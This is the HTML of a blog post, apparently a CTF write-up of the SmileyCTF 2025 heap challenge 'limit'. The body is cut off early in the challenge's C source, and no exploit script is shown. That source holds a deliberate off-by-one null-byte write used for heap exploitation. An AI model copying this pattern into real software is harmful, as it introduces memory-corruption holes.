<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en-us">
  <head><script src="/d1ff/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=d1ff/livereload" data-no-instant defer></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>SmileyCTF 2025 Writeup (Pwn/Limit) - d1ff</title><meta name="author" content="_d1ff">
<meta name="description" content="Over the weekend, I teamed up with friends to play SmileyCTF, and the experience was fantastic.
The pwn challenges stood out — they were tough, rewarding, and helped sharpen my skills.
This writeup covers the limit challenge in detail.
Before diving deeper, let’s take a quick moment to understand the source code of the challenge.
Source Code1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;stdint.h&gt; #include &lt;fcntl.h&gt; #include &lt;malloc.h&gt; char* chunks[0x10] = {0}; uint16_t sizes[0x10] = {0}; int main() { uint64_t idx; uint64_t sz; char* limit; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); free(malloc(0x418)); limit = (char*) sbrk(0); puts(&#34;hi&#34;); while (1) { puts(&#34;Options:&#34;); puts(&#34;1) malloc up to 0x100 bytes&#34;); puts(&#34;2) free chunks and clear ptr&#34;); puts(&#34;3) print chunks using puts&#34;); puts(&#34;4) read to chunks with max possible size&#34;); printf(&#34;&gt; &#34;); uint option; if (!scanf(&#34;%d&#34;, &amp;option)) { getchar(); } switch (option) { case 1: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } printf(&#34;Size: &#34;); if (!scanf(&#34;%ld&#34;, &amp;sz) || !sz || sz &gt; 0xf8) { puts(&#34;0 &lt; sz &lt;= 0xf8&#34;); break; } chunks[idx] = malloc(sz); if (chunks[idx] &gt; limit) { puts(&#34;hey where do you think ur going&#34;); // if (malloc_usable_size(chunks[idx])) free(chunks[idx]) chunks[idx] = 0; break; } uint16_t usable_size = sz &gt; 0x18 ? (sz&#43;7&amp;~0xf)&#43;8 : 0x18; sizes[idx] = usable_size; break; case 2: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } if (chunks[idx] == 0) { puts(&#34;no chunk at this idx&#34;); break; } free(chunks[idx]); chunks[idx] = 0; sizes[idx] = 0; break; case 3: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } if (!chunks[idx]) { puts(&#34;no chunk at this idx&#34;); break; } printf(&#34;Data: &#34;); puts(chunks[idx]); break; case 4: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } if (!chunks[idx]) { puts(&#34;no chunk at this idx&#34;); break; } printf(&#34;Data: &#34;); int len = read(0, chunks[idx], (uint) sizes[idx]); if (len &lt;= 0) { puts(&#34;read failed&#34;); break; } chunks[idx][len] = 0; break; default: puts(&#34;invalid option&#34;); break; } puts(&#34;&#34;); } _exit(0); } Ah, I get a wave of nostalgia every time I see note-maker-style heap challenges. But hold on—this one&rsquo;s not your typical heap playground. There&rsquo;s a sneaky twist waiting beneath the surface.
"><meta name="keywords" content='Heap Exploitation, tcache, null-byte-poisoning, FSOP'>
  <meta itemprop="name" content="SmileyCTF 2025 writeup (pwn/limit)">
  <meta itemprop="description" content="Over the weekend, I teamed up with friends to play SmileyCTF, and the experience was fantastic.
The pwn challenges stood out — they were tough, rewarding, and helped sharpen my skills.
This writeup covers the limit challenge in detail.
Before diving deeper, let’s take a quick moment to understand the source code of the challenge.
Source Code1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;stdint.h&gt; #include &lt;fcntl.h&gt; #include &lt;malloc.h&gt; char* chunks[0x10] = {0}; uint16_t sizes[0x10] = {0}; int main() { uint64_t idx; uint64_t sz; char* limit; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); free(malloc(0x418)); limit = (char*) sbrk(0); puts(&#34;hi&#34;); while (1) { puts(&#34;Options:&#34;); puts(&#34;1) malloc up to 0x100 bytes&#34;); puts(&#34;2) free chunks and clear ptr&#34;); puts(&#34;3) print chunks using puts&#34;); puts(&#34;4) read to chunks with max possible size&#34;); printf(&#34;&gt; &#34;); uint option; if (!scanf(&#34;%d&#34;, &amp;option)) { getchar(); } switch (option) { case 1: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } printf(&#34;Size: &#34;); if (!scanf(&#34;%ld&#34;, &amp;sz) || !sz || sz &gt; 0xf8) { puts(&#34;0 &lt; sz &lt;= 0xf8&#34;); break; } chunks[idx] = malloc(sz); if (chunks[idx] &gt; limit) { puts(&#34;hey where do you think ur going&#34;); // if (malloc_usable_size(chunks[idx])) free(chunks[idx]) chunks[idx] = 0; break; } uint16_t usable_size = sz &gt; 0x18 ? (sz&#43;7&amp;~0xf)&#43;8 : 0x18; sizes[idx] = usable_size; break; case 2: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } if (chunks[idx] == 0) { puts(&#34;no chunk at this idx&#34;); break; } free(chunks[idx]); chunks[idx] = 0; sizes[idx] = 0; break; case 3: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } if (!chunks[idx]) { puts(&#34;no chunk at this idx&#34;); break; } printf(&#34;Data: &#34;); puts(chunks[idx]); break; case 4: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } if (!chunks[idx]) { puts(&#34;no chunk at this idx&#34;); break; } printf(&#34;Data: &#34;); int len = read(0, chunks[idx], (uint) sizes[idx]); if (len &lt;= 0) { puts(&#34;read failed&#34;); break; } chunks[idx][len] = 0; break; default: puts(&#34;invalid option&#34;); break; } puts(&#34;&#34;); } _exit(0); } Ah, I get a wave of nostalgia every time I see note-maker-style heap challenges. But hold on—this one’s not your typical heap playground. There’s a sneaky twist waiting beneath the surface.">
  <meta itemprop="datePublished" content="2025-06-28T03:21:46+05:30">
  <meta itemprop="dateModified" content="2025-06-28T03:21:46+05:30">
  <meta itemprop="wordCount" content="4570">
  <meta itemprop="keywords" content="Heap Exploitation,Tcache,Null-Byte-Poisoning,FSOP"><meta property="og:url" content="http://localhost:1313/d1ff/posts/smiley_writeup/limit/">
  <meta property="og:site_name" content="d1ff">
  <meta property="og:title" content="SmileyCTF 2025 writeup (pwn/limit)">
  <meta property="og:description" content="Over the weekend, I teamed up with friends to play SmileyCTF, and the experience was fantastic.
The pwn challenges stood out — they were tough, rewarding, and helped sharpen my skills.
This writeup covers the limit challenge in detail.
Before diving deeper, let’s take a quick moment to understand the source code of the challenge.
Source Code1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;stdint.h&gt; #include &lt;fcntl.h&gt; #include &lt;malloc.h&gt; char* chunks[0x10] = {0}; uint16_t sizes[0x10] = {0}; int main() { uint64_t idx; uint64_t sz; char* limit; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); free(malloc(0x418)); limit = (char*) sbrk(0); puts(&#34;hi&#34;); while (1) { puts(&#34;Options:&#34;); puts(&#34;1) malloc up to 0x100 bytes&#34;); puts(&#34;2) free chunks and clear ptr&#34;); puts(&#34;3) print chunks using puts&#34;); puts(&#34;4) read to chunks with max possible size&#34;); printf(&#34;&gt; &#34;); uint option; if (!scanf(&#34;%d&#34;, &amp;option)) { getchar(); } switch (option) { case 1: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } printf(&#34;Size: &#34;); if (!scanf(&#34;%ld&#34;, &amp;sz) || !sz || sz &gt; 0xf8) { puts(&#34;0 &lt; sz &lt;= 0xf8&#34;); break; } chunks[idx] = malloc(sz); if (chunks[idx] &gt; limit) { puts(&#34;hey where do you think ur going&#34;); // if (malloc_usable_size(chunks[idx])) free(chunks[idx]) chunks[idx] = 0; break; } uint16_t usable_size = sz &gt; 0x18 ? (sz&#43;7&amp;~0xf)&#43;8 : 0x18; sizes[idx] = usable_size; break; case 2: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } if (chunks[idx] == 0) { puts(&#34;no chunk at this idx&#34;); break; } free(chunks[idx]); chunks[idx] = 0; sizes[idx] = 0; break; case 3: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } if (!chunks[idx]) { puts(&#34;no chunk at this idx&#34;); break; } printf(&#34;Data: &#34;); puts(chunks[idx]); break; case 4: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } if (!chunks[idx]) { puts(&#34;no chunk at this idx&#34;); break; } printf(&#34;Data: &#34;); int len = read(0, chunks[idx], (uint) sizes[idx]); if (len &lt;= 0) { puts(&#34;read failed&#34;); break; } chunks[idx][len] = 0; break; default: puts(&#34;invalid option&#34;); break; } puts(&#34;&#34;); } _exit(0); } Ah, I get a wave of nostalgia every time I see note-maker-style heap challenges. But hold on—this one’s not your typical heap playground. There’s a sneaky twist waiting beneath the surface.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-06-28T03:21:46+05:30">
    <meta property="article:modified_time" content="2025-06-28T03:21:46+05:30">
    <meta property="article:tag" content="Heap Exploitation">
    <meta property="article:tag" content="Tcache">
    <meta property="article:tag" content="Null-Byte-Poisoning">
    <meta property="article:tag" content="FSOP">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="SmileyCTF 2025 writeup (pwn/limit)">
  <meta name="twitter:description" content="Over the weekend, I teamed up with friends to play SmileyCTF, and the experience was fantastic.
The pwn challenges stood out — they were tough, rewarding, and helped sharpen my skills.
This writeup covers the limit challenge in detail.
Before diving deeper, let’s take a quick moment to understand the source code of the challenge.
Source Code1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;stdint.h&gt; #include &lt;fcntl.h&gt; #include &lt;malloc.h&gt; char* chunks[0x10] = {0}; uint16_t sizes[0x10] = {0}; int main() { uint64_t idx; uint64_t sz; char* limit; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); free(malloc(0x418)); limit = (char*) sbrk(0); puts(&#34;hi&#34;); while (1) { puts(&#34;Options:&#34;); puts(&#34;1) malloc up to 0x100 bytes&#34;); puts(&#34;2) free chunks and clear ptr&#34;); puts(&#34;3) print chunks using puts&#34;); puts(&#34;4) read to chunks with max possible size&#34;); printf(&#34;&gt; &#34;); uint option; if (!scanf(&#34;%d&#34;, &amp;option)) { getchar(); } switch (option) { case 1: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } printf(&#34;Size: &#34;); if (!scanf(&#34;%ld&#34;, &amp;sz) || !sz || sz &gt; 0xf8) { puts(&#34;0 &lt; sz &lt;= 0xf8&#34;); break; } chunks[idx] = malloc(sz); if (chunks[idx] &gt; limit) { puts(&#34;hey where do you think ur going&#34;); // if (malloc_usable_size(chunks[idx])) free(chunks[idx]) chunks[idx] = 0; break; } uint16_t usable_size = sz &gt; 0x18 ? (sz&#43;7&amp;~0xf)&#43;8 : 0x18; sizes[idx] = usable_size; break; case 2: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } if (chunks[idx] == 0) { puts(&#34;no chunk at this idx&#34;); break; } free(chunks[idx]); chunks[idx] = 0; sizes[idx] = 0; break; case 3: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } if (!chunks[idx]) { puts(&#34;no chunk at this idx&#34;); break; } printf(&#34;Data: &#34;); puts(chunks[idx]); break; case 4: printf(&#34;Index: &#34;); if (!scanf(&#34;%ld&#34;, &amp;idx) || idx &gt;= 0x10) { puts(&#34;idx &lt; 0x10&#34;); break; } if (!chunks[idx]) { puts(&#34;no chunk at this idx&#34;); break; } printf(&#34;Data: &#34;); int len = read(0, chunks[idx], (uint) sizes[idx]); if (len &lt;= 0) { puts(&#34;read failed&#34;); break; } chunks[idx][len] = 0; break; default: puts(&#34;invalid option&#34;); break; } puts(&#34;&#34;); } _exit(0); } Ah, I get a wave of nostalgia every time I see note-maker-style heap challenges. But hold on—this one’s not your typical heap playground. There’s a sneaky twist waiting beneath the surface.">
      <meta name="twitter:site" content="@Anuj1337">
<meta name="twitter:creator" content="@Anuj1337" /><meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="http://localhost:1313/d1ff/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/d1ff/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/d1ff/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/d1ff/apple-touch-icon.png"><link rel="mask-icon" href="http://localhost:1313/d1ff/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/d1ff/posts/smiley_writeup/limit/" title="SmileyCTF 2025 writeup (pwn/limit) - d1ff" /><link rel="prev" type="text/html" href="http://localhost:1313/d1ff/posts/squirrel_writeup/logon/" title="Squ1rrelCTF 2025 writeup (pwn/Squ1rrel_logon)" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/d1ff/posts/smiley_writeup/limit/index.md" title="SmileyCTF 2025 writeup (pwn/limit) - d1ff"><link rel="stylesheet" href="http://localhost:1313/d1ff/css/style.min.css"><link rel="preload" href="http://localhost:1313/d1ff/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="http://localhost:1313/d1ff/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="http://localhost:1313/d1ff/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="http://localhost:1313/d1ff/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "SmileyCTF 2025 writeup (pwn/limit)",
    "inLanguage": "en-us",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/d1ff\/posts\/smiley_writeup\/limit\/"
    },"genre": "posts","keywords": "Heap Exploitation, tcache, null-byte-poisoning, FSOP","wordcount":  4570 ,
    "url": "http:\/\/localhost:1313\/d1ff\/posts\/smiley_writeup\/limit\/","datePublished": "2025-06-28T03:21:46+05:30","dateModified": "2025-06-28T03:21:46+05:30","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "_d1ff"
      },"description": ""
  }
  </script><script src="http://localhost:1313/d1ff/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="http://localhost:1313/d1ff/" title="d1ff"><img class="logo" src='http://localhost:1313/d1ff/images/me.jpg' alt="d1ff" height="32" width="32"><span class="header-title-text">d1ff</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="http://localhost:1313/d1ff/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
              <a class="menu-link" href="http://localhost:1313/d1ff/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="http://localhost:1313/d1ff/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="http://localhost:1313/d1ff/" title="d1ff"><img class="logo" src='http://localhost:1313/d1ff/images/me.jpg' alt="d1ff" height="26" width="26"><span class="header-title-text">d1ff</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="menu-item"><a class="menu-link" href="http://localhost:1313/d1ff/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="http://localhost:1313/d1ff/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="http://localhost:1313/d1ff/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>SmileyCTF 2025 Writeup (Pwn/Limit)</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="https://discord.com/users/1157208253055381504" title="Author"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img class="avatar" src='http://localhost:1313/d1ff/images/me.jpg' alt="_d1ff" height="16" width="16">&nbsp;_d1ff</a></span><span class="post-included-in">&nbsp;included in <a href="http://localhost:1313/d1ff/categories/pwning/" class="post-category" title="Category - Pwning"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pwning</a></span></div><div class="post-meta-line"><span title="published on 2025-06-28 03:21:46"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-06-28">2025-06-28</time></span>&nbsp;<span title="4570 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 4600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>22 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#source-code">Source Code</a>
      <ul>
        <li><a href="#now-in--main-function">Now, In  main Function</a></li>
        <li><a href="#case-1-malloc-up-to-0x100-bytes">Case 1: Malloc up to 0x100 bytes</a></li>
        <li><a href="#case-2-free-chunks-and-clear-ptr">Case 2: Free chunks and clear ptr</a></li>
        <li><a href="#case-3-print-chunks-using-puts">Case 3: print chunks using puts</a></li>
        <li><a href="#case-4-read-to-chunks-with-max-possible-size">Case 4: Read to chunks with max possible size</a></li>
      </ul>
    </li>
    <li><a href="#additional-challenge-info">Additional challenge info</a></li>
    <li><a href="#leak-leak--leak-all-that-i-want-">LEAK, LEAK , LEAK all that I want !</a></li>
    <li><a href="#can-we-pwn-it-now">Can We Pwn It Now?</a></li>
    <li><a href="#null-byte-poisoning">Null Byte Poisoning</a>
      <ul>
        <li><a href="#chunk-metadata"><a href="https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/malloc/malloc.c#L1128">Chunk Metadata</a></a></li>
        <li><a href="#how-coalescing-is-performed"><a href="https://elixir.bootlin.com/glibc/glibc-2.3/source/malloc/malloc.c#L4102">How coalescing is performed?</a></a></li>
      </ul>
    </li>
    <li><a href="#getting-elf-leak">Getting ELF Leak</a>
      <ul>
        <li><a href="#-tcache-bins">📦 Tcache Bins</a></li>
        <li><a href="#leaking-elf-address">Leaking Elf Address</a></li>
      </ul>
    </li>
    <li><a href="#final-blow">Final Blow</a>
      <ul>
        <li><a href="#exploitation-script">Exploitation Script</a></li>
      </ul>
    </li>
    <li><a href="#-summary"><strong>.;,;.</strong> Summary</a></li>
    <li><a href="#resources-and-references">Resources and References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p>Over the weekend, I teamed up with friends to play <a href="https://play.ctf.gg/"target="_blank" rel="external nofollow noopener noreferrer"><strong>SmileyCTF</strong></a>, and the experience was fantastic.</p>
<p>The <strong>pwn challenges</strong> stood out — they were tough, rewarding, and helped sharpen my skills.</p>
<p>This writeup covers the <code>limit</code> challenge in detail.</p>
<p>Before diving deeper, let’s take a quick moment to understand the  <strong>source code</strong>  of the challenge.</p>
<h2 class="heading-element" id="source-code"><span>Source Code</span>
  <a href="#source-code" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;malloc.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span><span class="o">*</span> <span class="n">chunks</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint16_t</span> <span class="n">sizes</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">sz</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">limit</span><span class="p">;</span>
